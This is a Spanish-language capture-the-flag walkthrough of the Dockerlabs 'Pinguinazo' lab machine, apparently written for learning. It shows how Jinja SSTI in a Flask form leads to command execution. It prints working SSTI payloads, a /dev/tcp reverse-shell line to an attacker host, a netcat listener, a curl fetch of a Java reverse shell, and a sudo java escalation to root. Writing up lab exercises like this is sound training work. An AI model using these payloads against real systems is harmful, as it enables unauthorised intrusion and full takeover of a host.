# Pinguinazo

### Descripción

Pequeño CTF en modo **[easy](https://mega.nz/file/oGMWiKoJ#l02GwzicvsgLaczCjTSqaJNl5-NGajklpOY3A3Tu9to)** de Dockerlabs.

---

## 🔎 Reconocimiento

La máquina objetivo se encuentra correctamente desplegada dentro de la red de laboratorio (en este caso, utilizando Docker).  
Dado que la dirección IP es conocida o fácilmente identificable dentro de este entorno controlado, esta fase se clasifica como **reconocimiento pasivo**.

![Reconocimiento](https://i.imgur.com/rs4PSAQ.png)

---

## 📡 Escaneo

Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

El **target** corresponde a la IP de la máquina víctima: **172.17.0.2**

Resultados principales:

- Puerto **5000** abierto.
- Servicio en ejecución: aplicación Python con **Flask** y referencias a **Werkzeug**.

![Scan1](https://i.imgur.com/6UnWPSU.png)  
![Scan2](https://i.imgur.com/fZBZZWQ.png)

Incluso se observó la dirección MAC del objetivo.

---

## 📂 Enumeración

El siguiente paso fue buscar directorios y recursos ocultos.

Con **Gobuster**:

```bash
gobuster dir -u "http://172.17.0.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
```

El resultado fue limitado, por lo que se usó **dirb**, que reveló un recurso interesante:

![Dirb](https://i.imgur.com/FrTLh5h.png)

Se identificó `/console`, correspondiente a la **consola interactiva de Werkzeug**.  
En el código fuente de la web se encontraron datos sensibles como la **SECRET**, probablemente utilizada en la generación del PIN de acceso.

![Werkzeug1](https://i.imgur.com/qZt5KIJ.png)  
![Werkzeug2](https://i.imgur.com/C0b9r7G.png)

Además, la página principal contenía un formulario muy básico, con los siguientes puntos débiles:

- Input de correo en modo _readOnly_ (correo de administrador expuesto).
- Inputs sin validaciones (no requeridos).
- El campo _nombre_ parece usarse directamente como parámetro en el renderizado.

![Form1](https://i.imgur.com/KI8LbEo.png)  
![Form2](https://i.imgur.com/hekE1S3.png)

---

## 💥 Explotación

Se consideraron dos caminos:

1. **Bypass del PIN de Werkzeug**

   - Basado en parámetros como:
     - Usuario que ejecuta la app.
     - SECRET de la aplicación.
     - Dirección MAC de la máquina.
   - Existen scripts para generar posibles PINs, pero requieren tiempo y múltiples intentos válidos.

   ![Werkzeug Bypass](https://i.imgur.com/igjHHlp.png)

2. **Explotación del formulario principal**  
   Se probaron inyecciones:

   - **XSS**: `<script>alert('pwned');</script>`
   - **SSTI**: `{{ 2 * 8 }}`

   La inyección SSTI funcionó, confirmando vulnerabilidad en el render de templates.

![SSTI1](https://i.imgur.com/naclOMB.png)  
![SSTI2](https://i.imgur.com/0B2VOOy.png)

Ejemplo de payload ejecutando comandos del sistema:

```jinja
{{ config.__init__.__globals__['os'].popen('whoami').read() }}
```

Con Burp Suite (Repeater) se probó leer `/etc/passwd`:

![passwd1](https://i.imgur.com/rEyQTRG.png)  
![passwd2](https://i.imgur.com/aTAu5Gd.png)

✅ Quedó claro que la explotación vía SSTI era más directa y efectiva.

---

### 🌀 Reverse Shell

Se intentó una reverse shell usando la inyección SSTI. El payload exitoso fue:

```jinja
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen(
  'bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"').read() }}
```

**Consideraciones previas**:

- Definir la IP de escucha y puerto.
- Levantar el listener con:
  ```bash
  nc -lvnp 8080
  ```

![ReverseShell1](https://i.imgur.com/UZWpEfu.png)  
![ReverseShell2](https://i.imgur.com/QNAHOy2.png)

Con esto se obtuvo acceso inicial a la terminal.

---

## 🔝 Escalación de privilegios

Se buscaron binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/3B74T7F.png)

Aunque algunos binarios no eran explotables, se observó `/usr/bin/sudo` en la lista.  
Al ejecutar:

```bash
sudo -l
```

Se descubrió que la shell permitía ejecutar **Java** como root.

![SudoJava](https://i.imgur.com/nnztH1C.png)

Lo ideal sería aplicar una reverse shell ejecutada con sudo para optener los permisos de root, se consultó [reveshells]() para generar una donde se pueda acceder mediante sudo.

![SudoJava](https://i.imgur.com/3RroNqA.png)

**Nota**: Se tuvo en cuenta que no había una terminal interactiva en la máquina victima por lo que exportar TERM sería una opción sin embargo, en este caso se creó la shell desde máquina atacante y en la raiz del proyecto se ejecutó un `python3 -m http.server PORT` para servir el archivo.

Luego se obtuvo desde la máquina victima con `curl -O http://10.0.0.1:PORT/magic_shell.java`

Con la shell en la máquina victima se ejecutó con `sudo java magic_shell.java` y a pesar de generar warnings, se obtuvo la shell con el mítico _root_

![SudoJava](https://i.imgur.com/lgH3sZ1.png)

## ![SudoJava](https://i.imgur.com/wVFMqtT.png)
